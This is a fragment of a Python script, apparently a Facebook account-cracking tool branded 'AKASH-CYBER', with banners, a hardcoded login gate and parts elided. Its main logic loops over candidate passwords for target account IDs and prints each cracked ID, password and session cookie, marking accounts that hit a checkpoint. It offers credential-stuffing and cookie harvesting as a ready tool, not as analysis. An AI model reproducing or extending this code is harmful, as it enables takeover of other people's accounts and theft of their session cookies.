...
# =[•]=[SCRIPT]=[ADMIN]=[AKASH-CYBER]=[•]=
#------------------[ Install-1 ]-------------------#
#---[ FUCKED BY - @DARK_LMNx999 ]
#---[ FUCKED BY - @DARK_LMNx999 ]
#---[ FUCKED BY - @DARK_LMNx999 ]
#-----------------[ AKASH CYBER ]-------------------# 
...
while attemps < 12345677901:
    ...
    if username == 'AKASH'and password == 'CYBER':
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO AKASH-CYBER 71  FIRE (⚡)
...
#        result()
        ...
        back()
#        os.system('xdg-open https://wa.me/+8801310303638')
#    elif MAMA in ['0']:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                #MAMA-King
                print(f'\r\033[0;94m[{time.strftime("%H:%M")}•CYBER-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
                ...
                #MAMA-King
                print(f'\r\033[0;92m[CYBER-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
                print('\033[0;94m===============================================')
